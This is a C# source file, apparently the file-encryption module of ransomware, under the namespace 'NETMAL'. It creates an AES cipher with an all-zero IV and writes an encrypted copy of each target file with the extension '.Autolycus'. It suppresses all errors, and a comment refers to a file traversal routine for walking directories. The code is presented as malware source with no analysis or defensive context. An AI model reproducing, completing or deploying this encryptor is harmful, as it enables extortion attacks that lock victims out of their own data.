using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Intrinsics.X86;
using System.Text;
using System.Security.Cryptography;
using Aes = System.Security.Cryptography.Aes;

namespace NETMAL
{
    public class Encrypt
    {
        public static Aes Create()
        {
            Aes aes = Aes.Create();
            aes.GenerateKey();
            aes.IV = new byte[16] { 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00 };
            aes.Padding = PaddingMode.Zeros;
            aes.Mode = CipherMode.CBC;
            aes.KeySize = 256;
            aes.BlockSize = 128;
            return aes;
        }

        public void FileEncrypt(string inputfile, Aes aes) //was using filestream but will instead use filename and change working directory in the file traversal method
        {
            ICryptoTransform Autolycus = aes.CreateEncryptor();
            try
            {
                using (FileStream fsCrypt = new FileStream(inputfile + ".Autolycus", FileMode.Create))
                {
                    using (CryptoStream cs = new CryptoStream(fsCrypt, Autolycus, CryptoStreamMode.Write))
                    {
                        using (FileStream fsIn = new FileStream(inputfile, FileMode.Open))
                        {
                            byte[] buffer = new byte[1048576];
                            int read;
                            while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                            {
                                cs.Write(buffer, 0, read);
                            }
                        }
                    }
                }
            }
            catch
            {

            }
        }


    }
}